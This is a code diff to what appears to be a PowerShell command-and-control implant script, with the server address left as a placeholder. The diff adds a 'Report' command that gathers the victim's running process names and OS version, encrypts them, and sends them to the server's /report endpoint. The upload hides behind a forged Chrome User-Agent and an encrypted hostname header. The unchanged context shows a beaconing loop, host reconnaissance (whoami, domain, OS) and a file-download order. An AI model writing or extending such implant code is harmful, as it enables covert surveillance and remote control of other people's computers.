@@ -48,11 +48,14 @@ function DecryptCommand($key, $encryptedStringWithIV) {
 $progressPreference = 'silentlyContinue';
 $wc = New-Object system.Net.WebClient;
 $wc2 = New-Object system.Net.WebClient;
+$wcr = New-Object system.Net.WebClient;
 $hostname = hostname;
+$he = EncryptCommand $key $hostname
 $random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 $final_hostname = "$hostname-$random";
 $whoami = whoami;
-$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;
+$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
 $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
 # format the headers
@@ -73,7 +76,16 @@ while($true){
 
     if($fc -eq "False"){
       echo "DoNothig"
-    }elseif($fc.split(" ")[0] -eq "Download"){
+    }elseif($fc -eq "Report"){
+      $ps = foreach ($i in Get-Process){$i.ProcessName};
+      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
+      $pst = EncryptCommand $key $ps
+      $wcr.Headers.add("Authorization",$pst);
+      $wcr.Headers.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
+      $wcr.Headers.add("App-Logic", $he)
+      $wcr.downloadString("OCU_PROTO://SRVHOST/report");
+    }
+    elseif($fc.split(" ")[0] -eq "Download"){
       $filename = EncryptCommand $key $fc.split("\")[-1]
 
       echo "Download order to file $filename"
